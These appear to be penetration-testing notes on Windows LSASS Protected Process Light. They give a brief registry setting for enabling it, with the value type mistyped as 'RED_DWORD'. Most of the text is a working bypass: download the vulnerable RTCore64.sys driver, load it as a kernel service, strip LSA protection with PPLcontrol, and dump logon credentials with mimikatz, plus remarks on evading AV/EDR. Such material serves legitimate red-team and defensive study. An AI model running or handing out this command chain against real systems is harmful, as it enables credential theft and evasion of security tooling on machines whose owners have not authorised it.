Protected Process Light (`PPL`) is an integrity level Microsoft implemented that is higher than SYSTEM. This protects processes from being manipulated even with SYSTEM access. Lsass is one such supported process, and gets in the way of Mimikatz style dumping.
#### Enabling PPL
```powershell
HKLM\SYSTEM\CurrentControlSet\Control\Lsa

# Add the following Value / Type / Data
RunAsPPL / RED_DWORD / 0x00000001
```

#### Bypassing PPL
Mimikatz driver `mimidrv.sys` can be used to bypass PPL but it will get flagged by AV/EDR. To get around this, we can either make our own driver and sign it ourself (difficult!) or abuse a vulnerable driver.

Some recent tools such as `EDRSandblast` ([https://github.com/wavestone-cdt/EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast)), `PPLControl` ([https://github.com/itm4n/PPLcontrol](https://github.com/itm4n/PPLcontrol)), and `RToolZ` ([https://github.com/OmriBaso/RToolZ](https://github.com/OmriBaso/RToolZ)) can abuse a vulnerable driver to remove PPL. 

Example
```powershell
# Download vulnerable driver
RTCore64.sys from https://github.com/RedCursorSecurityConsulting/PPLKiller/blob/master/driver/RTCore64.sys

# Create Service
sc.exe create RTCore64 type= kernel start= auto binPath= C:\Users\svc_sql\Documents\RTCore64.sys DisplayName= "control"

# Start service
net start RTCore64

# List protected processes. Look for LSA
.\PPLcontrol.exe list     # Make note of LSA PID

# LSA PPL Bypass
.\PPLcontrol.exe unprotect <PID>

# Hashdump
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```